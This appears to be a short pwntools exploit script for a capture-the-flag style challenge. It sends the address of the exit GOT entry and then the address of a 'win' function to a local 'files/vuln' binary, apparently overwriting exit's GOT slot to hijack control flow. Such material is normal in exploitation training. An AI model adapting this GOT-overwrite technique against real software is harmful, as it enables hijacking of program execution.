from pwn import *

context.log_level = 'debug'
p = process('files/vuln')

exitgot = p.elf.symbols['got.exit']
winfunc = p.elf.symbols['win']

p.recvline()
p.recvline()

p.sendline(str(exitgot).encode('utf-8'))
p.recvline()

p.sendline(str(winfunc).encode('utf-8'))
p.recvall()
